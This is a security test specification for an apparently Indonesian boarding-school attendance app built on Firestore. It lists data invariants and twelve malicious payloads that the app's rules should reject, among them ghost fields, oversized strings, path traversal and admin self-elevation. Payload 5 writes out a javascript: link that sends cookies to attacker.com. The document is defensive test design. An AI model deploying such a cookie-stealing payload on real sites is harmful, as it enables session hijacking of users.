# Security Specification & Test-Driven Security Design

## 1. Data Invariants
1. `settings` collection:
   - Only authenticated administrators or the provisioned system admin can mutate app settings, social links, or locked geofence coordinates.
   - Public/unauthenticated users may read settings (`get` on `/settings/general`) to load public branding, social media links, and geofence radius.
2. `absensi_guru` collection:
   - Attendance records must contain valid fields: `tanggal`, `nama`, `status` in ['Hadir', 'Terlambat', 'Izin', 'Alpha'].
   - Status cannot be spoofed to unapproved states without proper authentication.
   - String boundaries: names, subjects, and notes must adhere to maximum length limits to prevent denial-of-wallet resource attacks.
3. `absensi_santri` collection:
   - Attendance documents must reference valid santri and date.
   - Creation and updates must enforce strict keys, required keys, and bounded string lengths.
4. `santri` collection:
   - Reads allowed for authorized portals.
   - Modifications restricted to admins.
5. `admins` collection:
   - Self-assignment of admin role is strictly forbidden. Users cannot create documents in `/admins/{uid}` unless authorized.

## 2. The "Dirty Dozen" Malicious Payloads (Designed to Break Identity & Integrity)

1. **Payload 1 (Ghost Field Injection / Shadow Update in Settings)**:
   Attempting to write an unauthorized admin flag or hidden backdoor into the settings document.
   `{ "id": "general", "nama_pondok": "Salaf", "isRootSuperAdmin": true, "backdoorKey": "bypass123" }`
   *Expected: PERMISSION_DENIED*

2. **Payload 2 (Denial of Wallet - 1MB String Injection in Geofence Zone Name)**:
   Attempting to exhaust storage and memory with a 1MB string for `geofencing_zone_name`.
   `{ "id": "general", "geofencing_zone_name": "A".repeat(1000000) }`
   *Expected: PERMISSION_DENIED*

3. **Payload 3 (ID Poisoning / Path Traversal Injection)**:
   Attempting to write with document ID containing path traversal characters:
   `../../hack/doc` or an oversized document ID (> 128 chars).
   *Expected: PERMISSION_DENIED*

4. **Payload 4 (Unauthenticated Modification of Geofence Coordinates)**:
   Unauthenticated user attempting to unlock and relocate geofence to unauthorized coordinates.
   `{ "geofencing_latitude": 0, "geofencing_longitude": 0, "geofencing_locked": false }`
   *Expected: PERMISSION_DENIED*

5. **Payload 5 (Social Media Link Injection with Malicious Protocol)**:
   Attempting to inject `javascript:alert(1)` or oversized payloads (> 500 chars) into `link_instagram`.
   `{ "link_instagram": "javascript:fetch('//attacker.com?cookie='+document.cookie)" }`
   *Expected: PERMISSION_DENIED*

6. **Payload 6 (Absensi Status Spoofing)**:
   Attempting to write invalid status value e.g. `status: "SuperHadirPermitMaster"` outside the enum `["Hadir", "Terlambat", "Izin", "Alpha"]`.
   *Expected: PERMISSION_DENIED*

7. **Payload 7 (Oversized Attendance Note Attack)**:
   Attempting to write 50KB notes in `catatan` of `absensi_guru` to inflate read costs.
   `{ "id": "abs-01", "nama": "Ustadz", "status": "Hadir", "tanggal": "2026-09-29", "catatan": "X".repeat(50000) }`
   *Expected: PERMISSION_DENIED*

8. **Payload 8 (Self-Elevating Admin Registration)**:
   Regular user attempting to write a document to `/admins/{their_uid}` to grant themselves admin privileges.
   `{ "id": "user123", "email": "attacker@fake.com", "role": "admin" }`
   *Expected: PERMISSION_DENIED*

9. **Payload 9 (Blanket Read Scraping / Query Trust Exploitation)**:
   Attempting unconstrained wildcard queries across unindexed collections without credentials.
   *Expected: PERMISSION_DENIED*

10. **Payload 10 (Santri NIS Spoofing / Account Tampering)**:
    Attempting to overwrite another santri's exam scores or pocket money balance directly from the client.
    `{ "id": "S-1001", "saldoUangSaku": 999999999, "nilaiBacaKitab": 100 }`
    *Expected: PERMISSION_DENIED*

11. **Payload 11 (Invalid Coordinate Type Poisoning)**:
    Sending non-numeric string representations or Infinity for latitude/longitude:
    `{ "geofencing_latitude": "NaN", "geofencing_longitude": true }`
    *Expected: PERMISSION_DENIED*

12. **Payload 12 (Direct Deletion of Settings / Master Records)**:
    Unprivileged client attempting to delete the master `/settings/general` document.
    *Expected: PERMISSION_DENIED*
